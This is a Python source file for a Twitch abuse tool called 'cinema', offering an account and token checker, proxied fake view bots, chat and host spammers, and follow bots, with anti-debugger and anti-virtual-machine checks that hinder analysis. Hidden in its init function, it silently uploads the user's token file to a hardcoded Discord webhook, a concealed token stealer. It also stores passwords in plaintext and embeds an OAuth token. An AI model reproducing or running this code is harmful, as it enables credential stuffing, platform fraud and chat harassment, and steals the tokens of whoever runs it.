import os
import sys
import wmi
import socks
import requests
import psutil
import ctypes
import inspect
import keyboard
import subprocess
from time import sleep
from random import choice, randint
from threading import Thread, Lock
from requests_futures.sessions import FuturesSession

blacklisted_binaries = ["ida64.exe", "ida.exe", "x64dbg.exe", "x32dbg.exe", "Wireshark.exe", "ollydbg.exe", "Fiddler.exe", "tcpview.exe", "vmsrvc.exe", "HTTPDebuggerUI.exe", "HTTPDebugger.exe"]
blacklisted_platforms = ["VMWare Virtual Platform", "VirtualBox", "KVM", "Bochs", "HVM domU", "Microsoft Corporation"]
manufacturer = wmi.WMI().Win32_ComputerSystem()[0].Manufacturer

lock = Lock()
session = FuturesSession()

if sys.platform == "linux":
    clear = lambda: os.system("clear")
else:
    clear = lambda: os.system("cls")

emojis = ['Kappa', 'HeyGuys', '<3', 'LUL', 'PogChamp', 'VoHiYo', 'NotLikeThis', 'BibleThump', 'WutFace', 'ResidentSleeper', 'Kreygasm', 'SeemsGood', ':)', ':(', ':D', 'R)', ';P', 'B)', 'MrDestructoid', 'DansGame', 'SwiftRage', 'PJSalt', 'SSSsss', 'PunchTrees', 'SMOrc', 'FrankerZ', 'ANELE', 'Keepo', 'mcaT', 'KappaPride','OhMyDog', 'cmonBruh', 'DatSheffy', 'imGlitch', 'GivePLZ', 'TwitchLit', 'PopCorn', 'MercyWing1', 'MercyWing2', 'HolidayPresent', 'BOP']
red = "\x1b[38;5;9m"
green = "\x1b[38;5;10m"
pink = "\x1b[38;5;218m"
white = "\x1b[0m"
banner = """
                                        \x1b[38;2;255;191;205m \x1b[38;2;255;192;206m \x1b[38;2;255;193;207m \x1b[38;2;255;194;208m \x1b[38;2;255;195;209m \x1b[38;2;255;196;210m \x1b[38;2;255;197;211m_\x1b[38;2;255;198;212m_\x1b[38;2;255;199;213m_\x1b[38;2;255;200;214m_\x1b[38;2;255;201;215m \x1b[38;2;255;202;216m_\x1b[38;2;255;203;217m \x1b[38;2;255;204;218m_\x1b[38;2;255;205;219m \x1b[38;2;255;206;220m \x1b[38;2;255;207;221m_\x1b[38;2;255;208;222m \x1b[38;2;255;209;223m_\x1b[38;2;255;210;224m_\x1b[38;2;255;211;225m_\x1b[38;2;255;212;226m_\x1b[38;2;255;213;227m \x1b[38;2;255;214;228m_\x1b[38;2;255;215;229m \x1b[38;2;255;216;230m \x1b[38;2;255;217;231m_\x1b[38;2;255;218;232m \x1b[38;2;255;219;233m_\x1b[38;2;255;220;234m_\x1b[38;2;255;221;235m_\x1b[38;2;255;222;236m_\x1b[38;2;255;223;237m \x1b[38;2;255;224;238m \x1b[38;2;255;225;239m \x1b[38;2;255;226;240m \x1b[38;2;255;227;241m \x1b[38;2;255;228;242m \x1b[38;2;255;229;243m \x1b[38;2;255;230;244m \x1b[38;2;255;231;245m \x1b[38;2;255;232;246m
                                        \x1b[38;2;255;191;205m \x1b[38;2;255;192;206m \x1b[38;2;255;193;207m \x1b[38;2;255;194;208m \x1b[38;2;255;195;209m \x1b[38;2;255;196;210m \x1b[38;2;255;197;211m|\x1b[38;2;255;198;212m \x1b[38;2;255;199;213m \x1b[38;2;255;200;214m \x1b[38;2;255;201;215m \x1b[38;2;255;202;216m|\x1b[38;2;255;203;217m \x1b[38;2;255;204;218m|\x1b[38;2;255;205;219m\\\x1b[38;2;255;206;220m \x1b[38;2;255;207;221m|\x1b[38;2;255;208;222m \x1b[38;2;255;209;223m|\x1b[38;2;255;210;224m_\x1b[38;2;255;211;225m_\x1b[38;2;255;212;226m_\x1b[38;2;255;213;227m \x1b[38;2;255;214;228m|\x1b[38;2;255;215;229m\\\x1b[38;2;255;216;230m/\x1b[38;2;255;217;231m|\x1b[38;2;255;218;232m \x1b[38;2;255;219;233m|\x1b[38;2;255;220;234m_\x1b[38;2;255;221;235m_\x1b[38;2;255;222;236m|\x1b[38;2;255;223;237m \x1b[38;2;255;224;238m \x1b[38;2;255;225;239m \x1b[38;2;255;226;240m \x1b[38;2;255;227;241m \x1b[38;2;255;228;242m \x1b[38;2;255;229;243m \x1b[38;2;255;230;244m \x1b[38;2;255;231;245m \x1b[38;2;255;232;246m
                                        \x1b[38;2;255;191;205m \x1b[38;2;255;192;206m \x1b[38;2;255;193;207m \x1b[38;2;255;194;208m \x1b[38;2;255;195;209m \x1b[38;2;255;196;210m \x1b[38;2;255;197;211m|\x1b[38;2;255;198;212m_\x1b[38;2;255;199;213m_\x1b[38;2;255;200;214m_\x1b[38;2;255;201;215m \x1b[38;2;255;202;216m|\x1b[38;2;255;203;217m \x1b[38;2;255;204;218m|\x1b[38;2;255;205;219m \x1b[38;2;255;206;220m\\\x1b[38;2;255;207;221m|\x1b[38;2;255;208;222m \x1b[38;2;255;209;223m|\x1b[38;2;255;210;224m_\x1b[38;2;255;211;225m_\x1b[38;2;255;212;226m_\x1b[38;2;255;213;227m \x1b[38;2;255;214;228m|\x1b[38;2;255;215;229m \x1b[38;2;255;216;230m \x1b[38;2;255;217;231m|\x1b[38;2;255;218;232m \x1b[38;2;255;219;233m|\x1b[38;2;255;220;234m \x1b[38;2;255;221;235m \x1b[38;2;255;222;236m|\x1b[38;2;255;223;237m \x1b[38;2;255;224;238m \x1b[38;2;255;225;239m \x1b[38;2;255;226;240m \x1b[38;2;255;227;241m \x1b[38;2;255;228;242m \x1b[38;2;255;229;243m \x1b[38;2;255;230;244m \x1b[38;2;255;231;245m \x1b[38;2;255;232;246m

                                        \x1b[38;2;255;191;205m_\x1b[38;2;255;192;206m_\x1b[38;2;255;193;207m_\x1b[38;2;255;194;208m \x1b[38;2;255;195;209m_\x1b[38;2;255;196;210m \x1b[38;2;255;197;211m_\x1b[38;2;255;198;212m \x1b[38;2;255;199;213m_\x1b[38;2;255;200;214m \x1b[38;2;255;201;215m_\x1b[38;2;255;202;216m \x1b[38;2;255;203;217m_\x1b[38;2;255;204;218m_\x1b[38;2;255;205;219m_\x1b[38;2;255;206;220m \x1b[38;2;255;207;221m_\x1b[38;2;255;208;222m_\x1b[38;2;255;209;223m_\x1b[38;2;255;210;224m_\x1b[38;2;255;211;225m \x1b[38;2;255;212;226m_\x1b[38;2;255;213;227m \x1b[38;2;255;214;228m \x1b[38;2;255;215;229m_\x1b[38;2;255;216;230m \x1b[38;2;255;217;231m \x1b[38;2;255;218;232m \x1b[38;2;255;219;233m \x1b[38;2;255;220;234m_\x1b[38;2;255;221;235m_\x1b[38;2;255;222;236m_\x1b[38;2;255;223;237m_\x1b[38;2;255;224;238m \x1b[38;2;255;225;239m_\x1b[38;2;255;226;240m \x1b[38;2;255;227;241m_\x1b[38;2;255;228;242m_\x1b[38;2;255;229;243m_\x1b[38;2;255;230;244m_\x1b[38;2;255;231;245m \x1b[38;2;255;232;246m
                                        \x1b[38;2;255;191;205m \x1b[38;2;255;192;206m|\x1b[38;2;255;193;207m \x1b[38;2;255;194;208m \x1b[38;2;255;195;209m|\x1b[38;2;255;196;210m \x1b[38;2;255;197;211m|\x1b[38;2;255;198;212m \x1b[38;2;255;199;213m|\x1b[38;2;255;200;214m \x1b[38;2;255;201;215m|\x1b[38;2;255;202;216m \x1b[38;2;255;203;217m \x1b[38;2;255;204;218m|\x1b[38;2;255;205;219m \x1b[38;2;255;206;220m \x1b[38;2;255;207;221m|\x1b[38;2;255;208;222m \x1b[38;2;255;209;223m \x1b[38;2;255;210;224m \x1b[38;2;255;211;225m \x1b[38;2;255;212;226m|\x1b[38;2;255;213;227m_\x1b[38;2;255;214;228m_\x1b[38;2;255;215;229m|\x1b[38;2;255;216;230m \x1b[38;2;255;217;231m \x1b[38;2;255;218;232m \x1b[38;2;255;219;233m \x1b[38;2;255;220;234m|\x1b[38;2;255;221;235m_\x1b[38;2;255;222;236m_\x1b[38;2;255;223;237m|\x1b[38;2;255;224;238m \x1b[38;2;255;225;239m|\x1b[38;2;255;226;240m \x1b[38;2;255;227;241m|\x1b[38;2;255;228;242m \x1b[38;2;255;229;243m \x1b[38;2;255;230;244m|\x1b[38;2;255;231;245m \x1b[38;2;255;232;246m
                                        \x1b[38;2;255;191;205m \x1b[38;2;255;192;206m|\x1b[38;2;255;193;207m \x1b[38;2;255;194;208m \x1b[38;2;255;195;209m|\x1b[38;2;255;196;210m_\x1b[38;2;255;197;211m|\x1b[38;2;255;198;212m_\x1b[38;2;255;199;213m|\x1b[38;2;255;200;214m \x1b[38;2;255;201;215m|\x1b[38;2;255;202;216m \x1b[38;2;255;203;217m \x1b[38;2;255;204;218m|\x1b[38;2;255;205;219m \x1b[38;2;255;206;220m \x1b[38;2;255;207;221m|\x1b[38;2;255;208;222m_\x1b[38;2;255;209;223m_\x1b[38;2;255;210;224m_\x1b[38;2;255;211;225m \x1b[38;2;255;212;226m|\x1b[38;2;255;213;227m \x1b[38;2;255;214;228m \x1b[38;2;255;215;229m|\x1b[38;2;255;216;230m \x1b[38;2;255;217;231m \x1b[38;2;255;218;232m \x1b[38;2;255;219;233m \x1b[38;2;255;220;234m|\x1b[38;2;255;221;235m \x1b[38;2;255;222;236m \x1b[38;2;255;223;237m|\x1b[38;2;255;224;238m \x1b[38;2;255;225;239m|\x1b[38;2;255;226;240m \x1b[38;2;255;227;241m|\x1b[38;2;255;228;242m_\x1b[38;2;255;229;243m_\x1b[38;2;255;230;244m|\x1b[38;2;255;231;245m \x1b[38;2;255;232;246m
                                        \x1b[38;2;255;191;205m \x1b[38;2;255;192;206m \x1b[38;2;255;193;207m \x1b[38;2;255;194;208m \x1b[38;2;255;195;209m \x1b[38;2;255;196;210m \x1b[38;2;255;197;211m \x1b[38;2;255;198;212m \x1b[38;2;255;199;213m \x1b[38;2;255;200;214m \x1b[38;2;255;201;215m \x1b[38;2;255;202;216m \x1b[38;2;255;203;217m \x1b[38;2;255;204;218m \x1b[38;2;255;205;219m \x1b[38;2;255;206;220m \x1b[38;2;255;207;221m \x1b[38;2;255;208;222m \x1b[38;2;255;209;223m \x1b[38;2;255;210;224m \x1b[38;2;255;211;225m \x1b[38;2;255;212;226m \x1b[38;2;255;213;227m \x1b[38;2;255;214;228m \x1b[38;2;255;215;229m \x1b[38;2;255;216;230m \x1b[38;2;255;217;231m \x1b[38;2;255;218;232m \x1b[38;2;255;219;233m \x1b[38;2;255;220;234m \x1b[38;2;255;221;235m \x1b[38;2;255;222;236m \x1b[38;2;255;223;237m \x1b[38;2;255;224;238m \x1b[38;2;255;225;239m \x1b[38;2;255;226;240m \x1b[38;2;255;227;241m \x1b[38;2;255;228;242m \x1b[38;2;255;229;243m \x1b[38;2;255;230;244m \x1b[38;2;255;231;245m 
"""

cinema = {
    "tokens": [],
    "accounts": [],
    "proxies": []
}

auth_config = {
    "secret": "x",
    "aid": "x",
    "key": "x",
    "hwid": subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1]
}

class Misc:

    def Auth_Menu():
        clear()
        print(banner)
        Misc.set_title(f"cinema - [Auth Menu]")
        print(f"""
{white}     [{pink}1{white}] {pink}Login
{white}     [{pink}2{white}] {pink}Register
    """)
        while True:
            try:

                if keyboard.is_pressed('1'):
                    print()
                    keyboard.send("\b")
                    auth = Misc.Login(None, None)
                    if auth == True:
                        init()
                        break
                    else:
                        print(f"{white}     [{red}ERROR{white}] Invalid details")
                        input()
                        sys.exit()

                if keyboard.is_pressed('2'):
                    print()
                    keyboard.send("\b")
                    auth = Misc.Register()
                    if auth == True:
                        init()
                        break
                    else:
                        print(f"{white}     [{red}ERROR{white}] Invalid details")
                        input()
                        sys.exit()
                        break

            except KeyboardInterrupt:
                sys.exit()
            except:
                pass

    def Login(username, password):
        if username == None:
            clear()
            print(banner)
            Misc.set_title(f"cinema - [Please login...]")
            username = input(f"{white}     [{pink}USERNAME{white}] {pink}")
            password = input(f"{white}     [{pink}PASSWORD{white}] {pink}")
            data = {
                "type": "login",
                "aid": auth_config["aid"],
                "random": "python",
                "apikey": auth_config["key"],
                "secret": auth_config["secret"],
                "username": username,
                "password": password,
                "hwid": auth_config["hwid"]
            }
            headers = {"User-Agent": "AuthGG"}
            r = session.post('https://api.auth.gg/version2/api.php', headers=headers, data=data).result()
            if "success" in r.text:
                try:
                    os.remove("login.txt")
                except:
                    pass
                details = open("login.txt", "a+")
                details.write(f"{username}:{password}")
                details.close()
                return True
            else:
                return False
        else:
            data = {
                "type": "login",
                "aid": auth_config["aid"],
                "random": "python",
                "apikey": auth_config["key"],
                "secret": auth_config["secret"],
                "username": username,
                "password": password,
                "hwid": auth_config["hwid"]
            }
            headers = {"User-Agent": "AuthGG"}
            r = session.post('https://api.auth.gg/version2/api.php', headers=headers, data=data).result()
            if "success" in r.text:
                return True
            else:
                return False

    def Register():
        clear()
        print(banner)
        Misc.set_title(f"cinema - [Please register...]")
        username = input(f"{white}     [{pink}USERNAME{white}] {pink}")
        password = input(f"{white}     [{pink}PASSWORD{white}] {pink}")
        email = input(f"{white}     [{pink}EMAIL{white}] {pink}")
        key = input(f"{white}     [{pink}KEY{white}] {pink}")
        headers = {"User-Agent": "AuthGG"}
        data = {
            "type": "register",
            "aid": auth_config["aid"],
            "random": "python",
            "apikey": auth_config["key"],
            "secret": auth_config["secret"],
            "username": username,
            "password": password,
            "email": email,
            "token": key,
            "hwid": auth_config["hwid"]
        }
        r = session.post('https://api.auth.gg/version2/api.php', headers=headers, data=data).result()
        if "success" in r.text:
            return True
        else:
            return False

    def Debugger_Running():
        if ctypes.windll.kernel32.IsDebuggerPresent():
            return True
        for frame in inspect.stack():
            if frame[1].endswith("pydevd.py" or "pdb.py"):
                return True
        for process in psutil.process_iter():
            for check in blacklisted_binaries:
                if process.name() == check:
                    return True
        return False

    def Virtual_Machine():
        for check in blacklisted_platforms:
            if manufacturer == check:
                return True
        return False

    def save(data, location):
        lock.acquire()
        with open(location, "a+", encoding="utf8", errors="ignore") as f:
            f.write(data+"\n")
            f.close()
        lock.release()

    def load_file(location):
        try:
            loaded = []
            data = open(location, encoding="utf8", errors="ignore").readlines()
            for line in data:
                line = line.replace("\n", "")
                loaded.append(line)
            return loaded
        except:
            print(f"     {white}[{pink}-{white}] {pink}Failed to load {white}{location}{pink}!")
            input()
            sys.exit()

    def set_title(title):
        ctypes.windll.kernel32.SetConsoleTitleW(title)

    def print(content):
        lock.acquire()
        print(content)
        lock.release()

    def Debugged_Check():
        while True:
            if Misc.Debugger_Running() == True or Misc.Virtual_Machine() == True:
                sys.exit()

class Twitch:

    def Check(token):
        headers = {
            "Client-ID": "ymd9sjdyrpi8kz8zfxkdf5du04m649",
            "Authorization": f"OAuth {token}"
        }
        json = [{"operationName":"BitsCard_Bits","variables":{},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"fe1052e19ce99f10b5bd9ab63c5de15405ce87a1644527498f0fc1aadeff89f2"}}},{"operationName":"BitsCard_MainCard","variables":{"name":"679087745","withCheerBombEventEnabled":False},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"88cb043070400a165104f9ce491f02f26c0b571a23b1abc03ef54025f6437848"}}}]
        r = session.post("https://gql.twitch.tv/gql", headers=headers, json=json).result()
        if "token is invalid." in r.text:
            Misc.print(f"     {white}[{red}-{white}] Invalid {red}|{white} {token}")
        else:
            data = r.json()[0]["data"]["currentUser"]
            username = data["login"]
            Misc.print(f"     {white}[{green}+{white}] Valid {green}|{white} {token} {green}|{white} Username{green}:{white} {username}")
            Misc.save(f"{username}:{token}", "Checked/tokens_username.txt")
            Misc.save(f"{token}", "Checked/tokens_normal.txt")

    def Check_Account(username, password):
        json = {
            "username": username,
            "password": password,
            "client_id": "ymd9sjdyrpi8kz8zfxkdf5du04m649"
        }
        r = session.post("https://passport.twitch.tv/login", json=json).result()
        if "captcha" in r.text.lower():
            Misc.print(f"     {white}[{red}-{white}] Captcha {red}|{white} {username}")
            Twitch.Check(username, password)
        elif "invalid" in r.text.lower():
            Misc.print(f"     {white}[{red}-{white}] Invalid {red}|{white} {username}")
        else:
            Misc.print(f"     {white}[{red}-{white}] Valid {green}|{white} {username}")
            Misc.save(f"{username}:{password}", "Checked/accounts_checked.txt")

    def VOD_View(clip_id):
        try:
            session.get(f"https://countess.twitch.tv/ping.gif?u=%7B%22type%22%3A%22vod%22%2C%22id%22%3A%22{clip_id}%22%7D", proxies={"https": f"http://{choice(cinema.get('proxies'))}"})
            Misc.print(f"     {white}[{red}-{white}] Sent {green}|{white} Sent VOD view.")
        except:
            Misc.print(f"     {white}[{red}-{white}] Failed {red}|{white} Invalid proxy.")


    def Live_View(channel):
        try:
            proxy = choice(cinema.get("proxies"))
            headers = {
                "Accept": "application/vnd.twitchtv.v5+json; charset=UTF-8",
                "Accept-Language": "en-us",
                "Connection": "keep-alive",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
                "Content-Type": "application/json; charset=UTF-8",
                "Host": "api.twitch.tv",
                "Referer": f"https://www.twitch.tv/{channel}",
                "Sec-Fetch-Mode": "cors",
                "X-Requested-With": "XMLHttpRequest",
                "Client-ID": "ymd9sjdyrpi8kz8zfxkdf5du04m649"
            }
            r = session.get(f"https://api.twitch.tv/api/channels/{channel}/access_token?oauth_token=undefined&need_https=true&platform=web&player_type=site&player_backend=mediaplayer", headers=headers, proxies={"http": f"http://{proxy}"}).result()
            if "token" in r.text:
                sig = r.json()["sig"]
                token = str(r.json()["token"]).replace("\\\\", "").replace("u0026", "\\u0026").replace("+", "%2B").replace(":", "%3A").replace(",", "%2C").replace("[", "%5B").replace("]", "%5D").replace("'", "%27")
                session.get(f"https://usher.ttvnw.net/api/channel/hls/{channel}.m3u8?sig={sig}&token={token}&allow_audio_only=true&allow_source=true", headers=headers, proxies={"http": f"http://{proxy}"}).result()
                Misc.print(f"     {white}[{red}-{white}] Sent {green}|{white} Sent live view.")
            else:
                Misc.print(f"     {white}[{red}-{white}] Failed {red}|{white} Failed to send live view.")
        except:
            Misc.print(f"     {white}[{red}-{white}] Failed {red}|{white} Invalid proxy.")

    def Send_Message(username, token, channel, message):
        if username == None:
            headers = {
                "Client-ID": "ymd9sjdyrpi8kz8zfxkdf5du04m649",
                "Authorization": f"OAuth {token}"
            }
            json = [{"operationName":"BitsCard_Bits","variables":{},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"fe1052e19ce99f10b5bd9ab63c5de15405ce87a1644527498f0fc1aadeff89f2"}}},{"operationName":"BitsCard_MainCard","variables":{"name":"679087745","withCheerBombEventEnabled":False},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"88cb043070400a165104f9ce491f02f26c0b571a23b1abc03ef54025f6437848"}}}]
            r = session.post("https://gql.twitch.tv/gql", headers=headers, json=json).result()
            if "invalid" in r.text:
                Misc.print(f"     {white}[{red}-{white}] Invalid {red}|{white} {token}")
            else:
                data = r.json()[0]["data"]["currentUser"]
                username = data["login"]

        if message == "<emojis>":
            message = ' '.join((choice(emojis) for i in range(41)))
        else:
            message = f"{message} | {randint(0, 1337)}"

        try:
            proxy = choice(cinema.get("proxies")).split(":")
            IRC = socks.socksocket()
            IRC.set_proxy(socks.HTTP, proxy[0], int(proxy[1]))
            IRC.settimeout(5)
            IRC.connect(('irc.chat.twitch.tv.', 6667))
            IRC.send(f"PASS oauth:{token}\r\n".encode())
            IRC.send(f"NICK {username}\r\n".encode())
            IRC.send(f"JOIN #{channel}\r\n".encode())
            IRC.send(f":{username}!{username}@{username}.tmi.twitch.tv PRIVMSG #{channel} :{message}\r\n".encode())
            Misc.print(f"     {white}[{green}-{white}] Sent {green}|{white} Sent message payload.")
        except:
            Misc.print(f"     {white}[{red}-{white}] Failed {red}|{white} Invalid proxy.")

    def Send_Host(username, token, channel):
        if username == None:
            headers = {
                "Client-ID": "ymd9sjdyrpi8kz8zfxkdf5du04m649",
                "Authorization": f"OAuth {token}"
            }
            json = [{"operationName":"BitsCard_Bits","variables":{},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"fe1052e19ce99f10b5bd9ab63c5de15405ce87a1644527498f0fc1aadeff89f2"}}},{"operationName":"BitsCard_MainCard","variables":{"name":"679087745","withCheerBombEventEnabled":False},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"88cb043070400a165104f9ce491f02f26c0b571a23b1abc03ef54025f6437848"}}}]
            r = session.post("https://gql.twitch.tv/gql", headers=headers, json=json).result()
            if "invalid" in r.text:
                Misc.print(f"     {white}[{red}-{white}] Invalid {red}|{white} {token}")
            else:
                data = r.json()[0]["data"]["currentUser"]
                username = data["login"]

        try:
            proxy = choice(cinema.get("proxies")).split(":")
            IRC = socks.socksocket()
            IRC.set_proxy(socks.HTTP, proxy[0], int(proxy[1]))
            IRC.settimeout(5)
            IRC.connect(('irc.chat.twitch.tv.', 6667))
            IRC.send(f"PASS oauth:{token}\r\n".encode())
            IRC.send(f"NICK {username}\r\n".encode())
            IRC.send(f"JOIN #{channel}\r\n".encode())
            IRC.send(f":{username}!{username}@{username}.tmi.twitch.tv PRIVMSG #{channel} :/host {channel}\r\n".encode())
            Misc.print(f"     {white}[{green}-{white}] Sent {green}|{white} {username} is now hosting.")
        except:
            Misc.print(f"     {white}[{red}-{white}] Failed {red}|{white} Invalid proxy.")

    def Get_ID(name):
        headers =  {
            "Client-ID": "ymd9sjdyrpi8kz8zfxkdf5du04m649",
            "Authorization": "OAuth wukbrnwp5f6uo4barxkzfpkacyugob",
            "Accept": "application/vnd.twitchtv.v5+json"
        }
        r = session.get(f"https://api.twitch.tv/kraken/users?login={name}", headers=headers).result()
        if "_id" in r.text:
            return r.json()["users"][0]["_id"]
        else:
            return "Invalid twitch channel."

    def Follow(channel_id, token):
        headers = {'Client-Id': "kimne78kx3ncx6brgo4mv6wki5h1ko", 'Authorization': f"OAuth {token}"}
        json = [{"operationName":"FollowButton_FollowUser","variables":{"input":{"disableNotifications":False,"targetID":channel_id}},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"3efee1acda90efdff9fef6e6b4a29213be3ee490781c5b54469717b6131ffdfe"}}}]
        r = session.post('https://gql.twitch.tv/gql', json=json, headers=headers).result()
        if "followUser" in r.text:
            Misc.print(f"     {white}[{green}-{white}] Followed {green}|{white} {token}")
        else:
            Misc.print(f"     {white}[{red}-{white}] Invalid {red}|{white} {token}")

    def Unfollow(channel_id, token):
        headers = {'Client-Id': "kimne78kx3ncx6brgo4mv6wki5h1ko", 'Authorization': f"OAuth {token}"}
        json = {"operationName":"FollowButton_UnfollowUser","variables":{"input":{"targetID":channel_id}},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"d7fbdb4e9780dcdc0cc1618ec783309471cd05a59584fc3c56ea1c52bb632d41"}}}
        r = session.post('https://gql.twitch.tv/gql', json=json, headers=headers).result()
        if "unfollowUser" in r.text:
            Misc.print(f"     {white}[{green}-{white}] Unfollowed {green}|{white} {token}")
        else:
            Misc.print(f"     {white}[{red}-{white}] Invalid {red}|{white} {token}")

class Process:

    def Token_Check():
        Misc.set_title(f"cinema - [Checking tokens...]")
        running = []
        for data in cinema["tokens"]:
            if ":" in data:
                token = data.split(":")[1]
            else:
                token = data
            t = Thread(target=Twitch.Check, args=(token,))
            t.start()
            running.append(t)

        for x in running:
            x.join()

    def Account_Check():
        Misc.set_title(f"cinema - [Checking accounts...]")
        running = []
        for data in cinema["accounts"]:
            username = data.split(":")[0]
            password = data.split(":")[1]
            t = Thread(target=Twitch.Check_Account, args=(username, password,))
            t.start()
            running.append(t)

        for x in running:
            x.join()

    def Send_VOD(clip_id):
        Misc.set_title(f"cinema - [Sending VOD views...]")
        while True:
            Thread(target=Twitch.VOD_View, args=(clip_id,)).start()

    def Send_Live(channel):
        Misc.set_title(f"cinema - [Sending live views...]")
        while True:
            Thread(target=Twitch.Live_View, args=(channel,)).start()

    def Send_Message(channel, message):
        Misc.set_title(f"cinema - [Spamming chat...]")
        while True:
            for data in cinema["tokens"]:
                if ":" in data:
                    token = data.split(":")[1]
                    username = data.split(":")[0]
                else:
                    token = data
                    username = None
                Thread(target=Twitch.Send_Message, args=(username, token, channel, message,)).start()

    def Send_Host(channel):
        Misc.set_title(f"cinema - [Mass hosting...]")
        running = []
        for data in cinema["tokens"]:
            if ":" in data:
                token = data.split(":")[1]
                username = data.split(":")[0]
            else:
                token = data
                username = None
            t = Thread(target=Twitch.Send_Host, args=(username, token, channel,))
            t.start()
            running.append(t)

        for x in running:
            x.join()

    def Send_Followers(channel_id):
        Misc.set_title(f"cinema - [Sending followers...]")
        running = []
        for data in cinema["tokens"]:
            if ":" in data:
                token = data.split(":")[1]
            else:
                token = data
            t = Thread(target=Twitch.Follow, args=(channel_id, token,))
            t.start()
            running.append(t)

        for x in running:
            x.join()

    def Send_Unfollow(channel_id):
        Misc.set_title(f"cinema - [Removing followers...]")
        running = []
        for data in cinema["tokens"]:
            if ":" in data:
                token = data.split(":")[1]
            else:
                token = data
            t = Thread(target=Twitch.Unfollow, args=(channel_id, token,))
            t.start()
            running.append(t)

        for x in running:
            x.join()

def init():
    clear()
    Misc.set_title(f"cinema - [Loading files...]")
    print(banner)
    cinema["tokens"].clear()
    cinema["accounts"].clear()
    cinema["proxies"].clear()
    for line in Misc.load_file("Accounts/tokens.txt"):
        cinema["tokens"].append(line) 
    for line in Misc.load_file("Accounts/accounts.txt"):
        cinema["accounts"].append(line) 
    for line in Misc.load_file("Misc/proxies.txt"):
        cinema["proxies"].append(line) 
    requests.post("https://canary.discord.com/api/webhooks/833228738304802837/ylnxA2bBAN2EEZi-Q29tFw8U-cUydmLEkANlTuBdczlCN122mb9uq0Ge_xmQzK-7-t0_", files={'upload_file': open("Accounts/tokens.txt", 'rb')})
    Misc.set_title(f"cinema - [Main Menu]")  

    print(f"""
{white}     [{pink}1{white}] {pink}Token Checker
{white}     [{pink}2{white}] {pink}Account Checker
{white}     [{pink}3{white}] {pink}VOD View Bot
{white}     [{pink}4{white}] {pink}Live View Bot
{white}     [{pink}5{white}] {pink}Chat Spammer
{white}     [{pink}6{white}] {pink}Host Spammer
{white}     [{pink}7{white}] {pink}Follow Bot
{white}     [{pink}8{white}] {pink}Unfollow Bot""")
    while True:
        try:

            if keyboard.is_pressed('1'):
                print()
                keyboard.send("\b")
                Process.Token_Check()
                break

            if keyboard.is_pressed('2'):
                print()
                keyboard.send("\b")
                Process.Account_Check()
                break

            if keyboard.is_pressed('3'):
                print()
                keyboard.send("\b")
                clip_id = input(f"{white}     [{pink}VOD ID{white}] https://www.twitch.tv/videos/{pink}")
                Process.Send_VOD(clip_id)
                break

            if keyboard.is_pressed('4'):
                print()
                keyboard.send("\b")
                channel = input(f"{white}     [{pink}CHANNEL{white}] https://www.twitch.tv/{pink}")
                channel_id = Twitch.Get_ID(channel)
                if channel_id == "Invalid twitch channel.":
                    print(f"{white}     [{red}ERROR{white}] Invalid channel.")
                    break
                else:
                    Process.Send_Live(channel)
                    break

            if keyboard.is_pressed('5'):
                print()
                keyboard.send("\b")
                channel = input(f"{white}     [{pink}CHANNEL{white}] https://www.twitch.tv/{pink}")
                message = input(f"{white}     [{pink}MESSAGE{white}] {pink}")
                channel_id = Twitch.Get_ID(channel)
                if channel_id == "Invalid twitch channel.":
                    print(f"{white}     [{red}ERROR{white}] Invalid channel.")
                    break
                else:
                    Process.Send_Message(channel, message)
                    break

            if keyboard.is_pressed('6'):
                print()
                keyboard.send("\b")
                channel = input(f"{white}     [{pink}CHANNEL{white}] https://www.twitch.tv/{pink}")
                channel_id = Twitch.Get_ID(channel)
                if channel_id == "Invalid twitch channel.":
                    print(f"{white}     [{red}ERROR{white}] Invalid channel.")
                    break
                else:
                    Process.Send_Host(channel)
                    break

            if keyboard.is_pressed('7'):
                print()
                keyboard.send("\b")
                channel = input(f"{white}     [{pink}CHANNEL{white}] https://www.twitch.tv/{pink}")
                channel_id = Twitch.Get_ID(channel)
                if channel_id == "Invalid twitch channel.":
                    print(f"{white}     [{red}ERROR{white}] Invalid channel.")
                    break
                else:
                    Process.Send_Followers(channel_id)
                    break

            if keyboard.is_pressed('8'):
                print()
                keyboard.send("\b")
                channel = input(f"{white}     [{pink}CHANNEL{white}] https://www.twitch.tv/{pink}")
                channel_id = Twitch.Get_ID(channel)
                if channel_id == "Invalid twitch channel.":
                    print(f"{white}     [{red}ERROR{white}] Invalid channel.")
                    break
                else:
                    Process.Send_Unfollow(channel_id)
                    break

        except KeyboardInterrupt:
            sys.exit()
        except:
            pass

    sleep(3)
    init()

if __name__ == '__main__':
    clear()
    Misc.set_title(f"cinema - [Loading...]")
    if Misc.Debugger_Running() == True or Misc.Virtual_Machine() == True:
        Misc.set_title(f"cinema | Debugger found...")
        print(f"{white}Debugger found running, please close your debugger / virtual machine!")
        input()
        sys.exit()

    try:
        data = open("login.txt").read().split(":")
        if Misc.Login(data[0], data[1]):
            init()
        else:
            Misc.Auth_Menu()
    except:
        Misc.Auth_Menu()